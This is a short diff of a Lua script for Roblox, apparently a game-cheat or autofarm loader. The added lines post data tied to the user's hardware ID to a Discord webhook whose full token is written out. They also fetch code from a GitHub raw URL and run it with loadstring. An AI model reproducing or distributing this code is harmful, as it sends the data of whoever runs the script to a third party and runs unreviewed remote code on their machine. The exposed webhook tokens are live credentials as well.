@@ -43,7 +43,7 @@ end
  
 if hwid then
 local HttpServ = game:GetService('HttpService')
-local url = "https://discordapp.com/api/webhooks/733377386732716043/PFTwicLULWD6sGunu1WWmjC8G-0xoPSvHAUmJEHe6AZh8ZceO3a71TYN3E4A-fCC9Uem"
+local url = "https://discord.com/api/webhooks/957311156857491527/MexssKV-RYyfJsRY2kKf2Gi7QZBtEARkgWBM-_6lM4Kd0adaUqnoaZE4Z04K7xQ8Kn0e"
  
  
 local data = 
@@ -103,4 +103,4 @@ local data =
     local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
     http_request(request_payload)
 end
-loadstring(game:HttpGet("https://gist.githubusercontent.com/Beast098/6560f2644b4c9ffa63d4b26bd08f9df8/raw/c994ebbf6e5d15420f1341d643c8707a2a694d2f/gistfile1.txt",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iamstillcool12345/autofarm/main/scscs",true))()
